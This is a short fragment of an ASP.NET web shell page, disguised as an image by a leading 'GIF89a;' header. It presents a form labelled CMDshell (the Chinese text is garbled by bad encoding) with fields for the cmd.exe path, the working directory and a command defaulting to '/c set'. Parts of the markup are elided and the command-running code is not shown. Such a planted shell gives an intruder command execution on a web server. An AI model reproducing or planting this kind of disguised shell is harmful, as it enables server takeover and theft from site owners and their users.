GIF89a;<%@ Page Language="C#" AutoEventWireup="true"%>
...
<body>
    ...
    <div style="text-align: left">
        <span style="color: #FF0033">��Ȩר��CMDshell<br />
            <br />
        </span>CMD ·��:<asp:TextBox ID="cmdpath" runat="server" BackColor="#003300" ForeColor="#33FF00" Width="755px">c:\windows\system32\cmd.exe</asp:TextBox><br />
        ��ǰ·��:<asp:TextBox ID="curdir" runat="server" BackColor="#003300" ForeColor="#33FF00" Width="755px"></asp:TextBox><br />
        CMD ����:<asp:TextBox ID="cmdline" runat="server" BackColor="#003300" ForeColor="#33FF00" Width="756px">/c set</asp:TextBox>
